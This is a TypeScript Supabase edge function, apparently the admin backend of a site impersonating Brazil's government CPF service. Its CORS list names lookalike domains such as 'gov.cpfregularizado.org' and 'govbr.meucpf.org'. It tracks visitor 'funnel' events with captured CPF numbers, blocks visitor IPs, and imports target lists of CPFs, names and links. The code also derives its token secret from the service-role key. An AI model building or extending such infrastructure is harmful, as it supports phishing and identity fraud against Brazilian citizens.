const ALLOWED_ORIGINS = [
  'https://my-status-checker.lovable.app',
  'https://id-preview--01e93b99-5c41-441e-b33b-75968963ece1.lovable.app',
  'https://gov.cpfregularizado.org',
  'https://govbr.cpfregularizado.org',
  'https://gov.regularizarocpf.org',
  'https://govbr.regularizarocpf.org',
  'https://gov.meucpf.org',
  'https://govbr.meucpf.org',
];

function getCorsHeaders(req: Request) {
  const origin = req.headers.get('origin') || '';
  const allowed = ALLOWED_ORIGINS.includes(origin) || origin.endsWith('.lovable.app');
  return {
    'Access-Control-Allow-Origin': allowed ? origin : ALLOWED_ORIGINS[0],
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Vary': 'Origin',
  };
}

import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

function toB64(str: string): string {
  return btoa(str).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function fromB64(str: string): string {
  let s = str.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return atob(s);
}

async function createToken(payload: Record<string, unknown>, secret: string): Promise<string> {
  const header = toB64(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const body = toB64(JSON.stringify({ ...payload, exp: Date.now() + 8 * 60 * 60 * 1000 })); // 8h instead of 24h
  const encoder = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', encoder.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', key, encoder.encode(`${header}.${body}`));
  const signature = toB64(String.fromCharCode(...new Uint8Array(sig)));
  return `${header}.${body}.${signature}`;
}

async function verifyToken(token: string, secret: string): Promise<Record<string, unknown> | null> {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    const [header, body, signature] = parts;
    const encoder = new TextEncoder();
    const key = await crypto.subtle.importKey('raw', encoder.encode(secret), { name: 'HMAC', hash: 'SHA-256' }, false, ['verify']);
    const sigBytes = Uint8Array.from(fromB64(signature), c => c.charCodeAt(0));
    const valid = await crypto.subtle.verify('HMAC', key, sigBytes, encoder.encode(`${header}.${body}`));
    if (!valid) return null;
    const payload = JSON.parse(fromB64(body));
    if (payload.exp < Date.now()) return null;
    return payload;
  } catch (e) {
    console.error('Token verify error:', e);
    return null;
  }
}

// Fetch all rows from a table, bypassing the 1000-row default limit
async function fetchAllRows(supabase: any, table: string, select: string, orderBy?: string, batchSize = 1000): Promise<any[]> {
  const allData: any[] = [];
  let offset = 0;
  let hasMore = true;

  while (hasMore) {
    let query = supabase.from(table).select(select).range(offset, offset + batchSize - 1);
    if (orderBy) {
      query = query.order(orderBy, { ascending: false });
    }
    const { data, error } = await query;
    if (error) {
      console.error(`fetchAllRows error on ${table}:`, error);
      break;
    }
    if (data && data.length > 0) {
      allData.push(...data);
      offset += batchSize;
      hasMore = data.length === batchSize;
    } else {
      hasMore = false;
    }
  }
  return allData;
}

// jsonResponse will be created inside the handler with proper CORS
let _corsHeaders: Record<string, string> = {};
const jsonResponse = (data: unknown, status = 200) =>
  new Response(JSON.stringify(data), { status, headers: { ..._corsHeaders, 'Content-Type': 'application/json' } });

// ─── RATE LIMITING ──────────────────────────────────────────
const MAX_LOGIN_ATTEMPTS = 5;     // max failed attempts
const LOCKOUT_MINUTES = 30;       // lockout window

async function checkRateLimit(supabase: any, ip: string): Promise<{ blocked: boolean; remaining: number }> {
  const windowStart = new Date(Date.now() - LOCKOUT_MINUTES * 60 * 1000).toISOString();
  
  const { data, error } = await supabase
    .from('login_attempts')
    .select('id', { count: 'exact' })
    .eq('ip_address', ip)
    .eq('success', false)
    .gte('created_at', windowStart);

  const count = data?.length || 0;
  return { blocked: count >= MAX_LOGIN_ATTEMPTS, remaining: Math.max(0, MAX_LOGIN_ATTEMPTS - count) };
}

async function recordLoginAttempt(supabase: any, ip: string, username: string, success: boolean) {
  await supabase.from('login_attempts').insert({ ip_address: ip, username, success });
  
  // Cleanup old attempts periodically (1 in 10 chance)
  if (Math.random() < 0.1) {
    try { await supabase.rpc('cleanup_old_login_attempts'); } catch {}
  }
}

// Extract client IP from request
function getClientIp(req: Request): string {
  return req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
    req.headers.get('x-real-ip') ||
    req.headers.get('cf-connecting-ip') ||
    'unknown';
}

Deno.serve(async (req) => {
  _corsHeaders = getCorsHeaders(req);
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: _corsHeaders });
  }

  const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
  const serviceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
  const tokenSecret = serviceKey.substring(0, 32);
  const supabase = createClient(supabaseUrl, serviceKey);
  const clientIp = getClientIp(req);

  try {
    const body = await req.json();
    const { action } = body;

    // ─── LOGIN (with rate limiting) ─────────────────────────────
    if (action === 'login') {
      const { username, password } = body;
      if (!username || !password) {
        return jsonResponse({ error: 'Credenciais obrigatórias' }, 400);
      }

      // Check rate limit
      const rateCheck = await checkRateLimit(supabase, clientIp);
      if (rateCheck.blocked) {
        console.warn(`[admin-auth] Rate limited IP ${clientIp} (user: ${username})`);
        return jsonResponse({ error: `Muitas tentativas. Tente novamente em ${LOCKOUT_MINUTES} minutos.` }, 429);
      }

      const { data: user, error } = await supabase.rpc('verify_admin_login', {
        p_username: username,
        p_password: password,
      });

      if (error || !user || user.length === 0) {
        // Record failed attempt
        await recordLoginAttempt(supabase, clientIp, username, false);
        const remaining = rateCheck.remaining - 1;
        console.warn(`[admin-auth] Failed login for "${username}" from ${clientIp} (${remaining} attempts left)`);
        return jsonResponse({ error: remaining > 0 ? `Credenciais inválidas (${remaining} tentativa${remaining !== 1 ? 's' : ''} restante${remaining !== 1 ? 's' : ''})` : `Muitas tentativas. Tente novamente em ${LOCKOUT_MINUTES} minutos.` }, 401);
      }

      const adminUser = user[0];
      
      // Record successful login & clear failed attempts for this IP
      await recordLoginAttempt(supabase, clientIp, username, true);
      await supabase.from('admin_users').update({ last_login: new Date().toISOString() }).eq('id', adminUser.id);

      const token = await createToken(
        { sub: adminUser.id, username: adminUser.username, name: adminUser.display_name, ip: clientIp },
        tokenSecret
      );

      console.log(`[admin-auth] Successful login for "${username}" from ${clientIp}`);
      return jsonResponse({ token, user: { id: adminUser.id, username: adminUser.username, display_name: adminUser.display_name } });
    }

    // ─── VERIFY TOKEN (all other actions) ───────────────────────
    const token = body.token || '';
    const claims = await verifyToken(token, tokenSecret);
    if (!claims) {
      return jsonResponse({ error: 'Não autorizado' }, 401);
    }

    // ─── DASHBOARD STATS ────────────────────────────────────────
    if (action === 'dashboard') {
      const page = Math.max(1, Number(body.page) || 1);
      const perPage = Math.min(200, Math.max(10, Number(body.per_page) || 50));
      const from = (page - 1) * perPage;
      const to = from + perPage - 1;

      const [visitsHead, eventsHead, blockedHead] = await Promise.all([
        supabase.from('visits').select('*', { count: 'exact', head: true }),
        supabase.from('funnel_events').select('*', { count: 'exact', head: true }),
        supabase.from('blocked_ips').select('*', { count: 'exact', head: true }),
      ]);

      const [paginatedVisits, paginatedFunnel, paginatedBlocked] = await Promise.all([
        supabase.from('visits').select('*').order('created_at', { ascending: false }).range(from, to),
        supabase.from('funnel_events').select('event_type, cpf, created_at, metadata, session_id').order('created_at', { ascending: false }).range(from, to),
        supabase.from('blocked_ips').select('*').order('created_at', { ascending: false }).range(from, to),
      ]);

      const countryData = await fetchAllRows(supabase, 'visits', 'country_code, city, region, is_mobile, session_id', 'created_at');
      const validSessionIds = [...new Set(countryData.map((v: any) => v.session_id).filter(Boolean))];

      let allFunnelData: any[] = [];
      const batchSize = 200;
      for (let i = 0; i < validSessionIds.length; i += batchSize) {
        const batch = validSessionIds.slice(i, i + batchSize);
        const { data } = await supabase
          .from('funnel_events')
          .select('event_type, cpf, session_id, metadata')
          .in('session_id', batch);
        if (data) allFunnelData = allFunnelData.concat(data);
      }

      // Get recent login attempts for security overview
      const { data: recentAttempts } = await supabase
        .from('login_attempts')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(20);

      return jsonResponse({
        stats: {
          total_visits: visitsHead.count || 0,
          total_events: eventsHead.count || 0,
          total_blocked: blockedHead.count || 0,
        },
        recentVisits: paginatedVisits.data || [],
        funnelData: paginatedFunnel.data || [],
        allFunnelData: allFunnelData,
        countryData: countryData,
        blockedList: paginatedBlocked.data || [],
        loginAttempts: recentAttempts || [],
        pagination: {
          page,
          per_page: perPage,
          visits_total: visitsHead.count || 0,
          funnel_total: eventsHead.count || 0,
          blocked_total: blockedHead.count || 0,
        },
      });
    }

    // LIST ADMIN USERS
    if (action === 'list_users') {
      const { data: users } = await supabase
        .from('admin_users')
        .select('id, username, display_name, created_at, last_login')
        .order('created_at', { ascending: true });

      return jsonResponse({ users: users || [] });
    }

    // ADD ADMIN USER — only the original admin (username=admin) can create new users
    if (action === 'add_user') {
      // Verify that the requesting user is the primary admin
      if (claims.username !== 'admin') {
        console.warn(`[admin-auth] Non-primary admin "${claims.username}" tried to create user from ${clientIp}`);
        return jsonResponse({ error: 'Apenas o administrador principal pode criar usuários' }, 403);
      }

      const { username, password, display_name } = body;
      if (!username || !password) {
        return jsonResponse({ error: 'Username e senha obrigatórios' }, 400);
      }

      // Validate password strength
      if (password.length < 8) {
        return jsonResponse({ error: 'Senha deve ter no mínimo 8 caracteres' }, 400);
      }

      // Limit total admin users
      const { count } = await supabase.from('admin_users').select('*', { count: 'exact', head: true });
      if ((count || 0) >= 3) {
        return jsonResponse({ error: 'Limite máximo de 3 administradores atingido' }, 400);
      }

      const { error } = await supabase.rpc('create_admin_user', {
        p_username: username,
        p_password: password,
        p_display_name: display_name || username,
      });

      if (error) {
        return jsonResponse({ error: error.message.includes('unique') ? 'Usuário já existe' : error.message }, 400);
      }

      console.log(`[admin-auth] New admin "${username}" created by "${claims.username}" from ${clientIp}`);
      return jsonResponse({ ok: true });
    }

    // DELETE ADMIN USER
    if (action === 'delete_user') {
      // Only primary admin can delete
      if (claims.username !== 'admin') {
        return jsonResponse({ error: 'Apenas o administrador principal pode remover usuários' }, 403);
      }

      const { user_id } = body;
      if (user_id === claims.sub) {
        return jsonResponse({ error: 'Não é possível remover seu próprio usuário' }, 400);
      }

      // Prevent deleting the primary admin
      const { data: targetUser } = await supabase.from('admin_users').select('username').eq('id', user_id).maybeSingle();
      if (targetUser?.username === 'admin') {
        return jsonResponse({ error: 'Não é possível remover o administrador principal' }, 400);
      }

      await supabase.from('admin_users').delete().eq('id', user_id);
      console.log(`[admin-auth] Admin user ${user_id} deleted by "${claims.username}" from ${clientIp}`);
      return jsonResponse({ ok: true });
    }

    // BLOCK IP MANUALLY
    if (action === 'block_ip') {
      const { ip_address, reason } = body;
      if (!ip_address) {
        return jsonResponse({ error: 'IP obrigatório' }, 400);
      }
      const { error } = await supabase.from('blocked_ips').upsert(
        { ip_address, reason: reason || 'Bloqueio manual' },
        { onConflict: 'ip_address' }
      );
      if (error) {
        return jsonResponse({ error: error.message }, 400);
      }
      return jsonResponse({ ok: true });
    }

    // UNBLOCK IP
    if (action === 'unblock_ip') {
      const { ip_address } = body;
      if (!ip_address) {
        return jsonResponse({ error: 'IP obrigatório' }, 400);
      }
      await supabase.from('blocked_ips').delete().eq('ip_address', ip_address);
      return jsonResponse({ ok: true });
    }

    // CLEAR ALL DATA
    if (action === 'clear_data') {
      // Only primary admin can clear data
      if (claims.username !== 'admin') {
        return jsonResponse({ error: 'Apenas o administrador principal pode limpar dados' }, 403);
      }

      await Promise.all([
        supabase.from('funnel_events').delete().neq('id', '00000000-0000-0000-0000-000000000000'),
        supabase.from('visits').delete().neq('id', '00000000-0000-0000-0000-000000000000'),
        supabase.from('blocked_ips').delete().neq('id', '00000000-0000-0000-0000-000000000000'),
        supabase.from('login_attempts').delete().neq('id', '00000000-0000-0000-0000-000000000000'),
      ]);
      console.log(`[admin-auth] All data cleared by "${claims.username}" from ${clientIp}`);
      return jsonResponse({ ok: true, message: 'Dados limpos com sucesso' });
    }

    // ─── WHITELIST ──────────────────────────────────────────────
    if (action === 'whitelist_list') {
      const [entriesRes, settingRes] = await Promise.all([
        supabase.from('cpf_whitelist').select('*').order('created_at', { ascending: false }),
        supabase.from('app_settings').select('value').eq('key', 'whitelist_enabled').maybeSingle(),
      ]);
      return jsonResponse({
        entries: entriesRes.data || [],
        enabled: settingRes.data?.value === 'true',
      });
    }

    if (action === 'whitelist_toggle') {
      const { enabled } = body;
      await supabase.from('app_settings').upsert(
        { key: 'whitelist_enabled', value: enabled ? 'true' : 'false', updated_at: new Date().toISOString() },
        { onConflict: 'key' }
      );
      return jsonResponse({ ok: true, enabled });
    }

    if (action === 'whitelist_delete') {
      const { id } = body;
      if (!id) return jsonResponse({ error: 'id obrigatório' }, 400);
      await supabase.from('cpf_whitelist').delete().eq('id', id);
      return jsonResponse({ ok: true });
    }

    if (action === 'whitelist_import') {
      const { entries } = body;
      if (!Array.isArray(entries) || entries.length === 0) {
        return jsonResponse({ error: 'Nenhuma entrada válida' }, 400);
      }
      const valid = entries
        .filter((e: any) => typeof e.cpf === 'string' && /^\d{11}$/.test(e.cpf))
        .map((e: any) => ({
          numero: String(e.numero || '').substring(0, 50),
          cpf: e.cpf,
          nome: String(e.nome || '').substring(0, 200),
          link: String(e.link || '').substring(0, 500),
        }));

      if (valid.length === 0) return jsonResponse({ imported: 0, skipped: 0 });

      let imported = 0;
      let skipped = 0;
      const importBatchSize = 500;
      for (let i = 0; i < valid.length; i += importBatchSize) {
        const batch = valid.slice(i, i + importBatchSize);
        const { error } = await supabase
          .from('cpf_whitelist')
          .upsert(batch, { onConflict: 'cpf', ignoreDuplicates: true });
        if (!error) imported += batch.length;
        else skipped += batch.length;
      }
      return jsonResponse({ imported, skipped });
    }

    return jsonResponse({ error: 'Ação inválida' }, 400);
  } catch (error) {
    console.error('Admin auth error:', error);
    return jsonResponse({ error: 'Erro interno' }, 500); // Don't leak error details
  }
});
